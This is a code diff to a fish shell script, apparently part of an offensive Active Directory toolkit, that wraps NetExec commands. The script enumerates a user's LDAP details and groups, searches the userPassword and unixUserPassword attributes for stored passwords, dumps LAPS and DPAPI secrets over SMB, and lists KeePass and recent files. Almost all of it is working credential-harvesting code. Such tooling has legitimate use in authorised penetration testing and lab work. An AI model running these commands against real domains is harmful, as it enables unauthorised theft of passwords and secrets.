@@ -127,10 +127,37 @@ Examples:
 
     ezpz_title "Starting user enumeration for '$user' on $target..."
 
+    ezpz_header "Enumerating '$user' account details"
+    ezpz_cmd "nxc ldap $nxc_auth -M whoami -o USER=\"$user\""
+    ezpz_spin timeout 60 nxc ldap $nxc_auth -M whoami -o USER="$user" \
+        | sed -E 's/^([^[:space:]]+[[:space:]]+){4}//' \
+        | grep -aiE '^(Name|Description|sAMAccountName|Enabled|Password Never Expires|Last logon|Password Last Set|Bad Password Count|Distinguished Name|Member of|User SID):'
+    if test $pipestatus[1] -eq 124
+        ezpz_warn "Operation timed out. Skipping."
+    end
+
     # Enumerate user groups
     ezpz_header "Enumerating '$user' groups"
     ezpz_cmd "nxc ldap $nxc_auth -M groupmembership -o USER=\"$user\""
     ezpz_spin timeout 60 nxc ldap $nxc_auth -M groupmembership -o USER="$user" | tail -n +4 | tr -s " " | cut -d " " -f 5-
+    if test $pipestatus[1] -eq 124
+        ezpz_warn "Operation timed out. Skipping."
+    end
+
+    ezpz_header "Searching for userPassword attribute"
+    ezpz_cmd "nxc ldap $nxc_auth -M get-userPassword"
+    ezpz_spin timeout 60 nxc ldap $nxc_auth -M get-userPassword \
+        | sed -E 's/^([^[:space:]]+[[:space:]]+){4}//' \
+        | grep -avE '^\[|^$'
+    if test $pipestatus[1] -eq 124
+        ezpz_warn "Operation timed out. Skipping."
+    end
+
+    ezpz_header "Searching for unixUserPassword attribute"
+    ezpz_cmd "nxc ldap $nxc_auth -M get-unixUserPassword"
+    ezpz_spin timeout 60 nxc ldap $nxc_auth -M get-unixUserPassword \
+        | sed -E 's/^([^[:space:]]+[[:space:]]+){4}//' \
+        | grep -avE '^\[|^$'
     if test $pipestatus[1] -eq 124
         ezpz_warn "Operation timed out. Skipping."
     end
@@ -152,10 +179,22 @@ Examples:
     end
     
     ezpz_cmd "nxc smb $nxc_auth --laps --dpapi"
-    ezpz_spin timeout 60 nxc smb $nxc_auth --laps --dpapi | tail -n +4 | tr -s " " | cut -d " " -f 6-
-    if test $pipestatus[1] -eq 124
+    set -l dpapi_tmp (mktemp)
+    ezpz_spin_capture $dpapi_tmp timeout 60 nxc smb $nxc_auth --laps --dpapi
+    set -l dpapi_rc $status
+    # Keep only actual secrets/errors; nxc's DPAPI preamble is noise.
+    set -l dpapi_lines (tr -d '\0' < $dpapi_tmp \
+        | sed -E 's/^([^[:space:]]+[[:space:]]+){4}//; s/^\[[!+*?-]\][[:space:]]*//' \
+        | grep -aE 'Domain:|^Dumped [0-9]+ DPAPI secrets|No result|No secrets found' \
+        | sort -u)
+    if test $dpapi_rc -eq 124
         ezpz_warn "Operation timed out. Skipping SMB LAPS."
+    else if test -n "$dpapi_lines"
+        printf '  %s\n' $dpapi_lines
+    else
+        ezpz_info "No LAPS or DPAPI results found."
     end
+    rm -f $dpapi_tmp
 
     # Try to find KeePass files
     ezpz_header "Trying to find KeePass files readable by user"
@@ -168,10 +207,24 @@ Examples:
     # Try to find Recent files
     ezpz_header "Trying to enumerate Recent Files"
     ezpz_cmd "nxc smb $nxc_auth -M recent_files"
-    ezpz_spin timeout 60 nxc smb $nxc_auth -M recent_files | grep -av '\[.\]' | tr -s " " | cut -d ' ' -f 5-
-    if test $pipestatus[1] -eq 124
+    set -l recent_tmp (mktemp)
+    ezpz_spin_capture $recent_tmp timeout 60 nxc smb $nxc_auth -M recent_files
+    set -l recent_rc $status
+    # The module can dump an impacket traceback when a directory is unreadable.
+    # Keep only Windows paths that look like actual results.
+    set -l recent_lines (tr -d '\0' < $recent_tmp \
+        | sed -E 's/^([^[:space:]]+[[:space:]]+){4}//; s/^[[:space:]]+//' \
+        | grep -aE '^[A-Za-z]:[\\\\]' \
+        | sed 's/[[:space:]]*$//' \
+        | sort -u)
+    if test $recent_rc -eq 124
         ezpz_warn "Operation timed out. Skipping."
+    else if test -n "$recent_lines"
+        printf '  %s\n' $recent_lines
+    else
+        ezpz_info "No recent files found."
     end
+    rm -f $recent_tmp
 
     ezpz_success "Done."
 end
